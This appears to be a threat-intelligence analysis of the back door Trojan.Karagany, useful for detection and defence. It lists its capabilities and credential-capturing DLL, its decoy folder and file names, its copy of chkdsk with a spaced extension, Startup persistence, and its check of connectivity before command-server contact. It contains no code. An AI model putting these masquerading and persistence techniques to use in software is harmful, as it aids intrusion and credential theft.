Trojan . Karagany Trojan . Karagany is a back door used primarily for recon . It is designed to download and install additional files and exfiltrate data . Samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer / protector for the payload . Where present in samples , the Delphi packer is configured to use ‘ neosphere ’ as a key to decrypt the payload . The following is a brief overview of the functionality of Trojan . Karagany : • Can upload , download , and execute files on the system • Has plugin capability ( may load several plugins for added functionality , such as Web injects ) • Payload is approximately 72Kb in size and is programmed in C / C++ • Contains a small embedded DLL file , which monitors WSASend and send APIs for capturing ‘ Basic Authentication ’ credentials Installation Trojan . Karagany creates a folder in the user APPDATA directory and chooses the directory name from the following list : • Microsoft WCF services • Broker services • Flash Utilities • Media Center Programs • Policy Definitions • Microsoft Web Tools • Reference Assemblies • Analysis Services • InstallShield Information • IIS SQL Server • Diagnostics • NTAPI Performance • WPF Platform It copies itself in the created directory with hidden and system attributes using a file name chosen from the following list : • SearchIndexer.exe • ImeBroker.exe • fsutil.exe • PnPutil.exe • BdeUISrv.exe • WinSAT.exe • pwNative.exe • SnippingTool.exe • DFDWizard.exe • PrintBrmEngine.exe • WbemMonitor.exe • dxpserver.exe • PowerMng.exe Trojan . Karagany copies itself with hidden and system attributes where it was first executed as err.log[DIGITS ] . It then copies the legitimate chkdsk utility in the installation folder using the payload file name but with a space before the file extension . This may fool ordinary users into thinking that this folder contains a legitimate application , for example PnPutil .exe . Trojan . Karagany!gen1 may create the following additional files in the installation folder : • Form.api • inact.api • prog.cer • Cent.api • ie.pdb It then creates a C:\ProgramData\Mail\MailAg\gl directory as a temporary directory used for uploading files . Trojan . Karagany then creates a link to itself in the Startup folder as an autostart when the system restarts . Networking Trojan . Karagany first checks for a live Internet connection by visiting Microsoft or Adobe websites . It will only reach out to its C&C server once this check is successful .
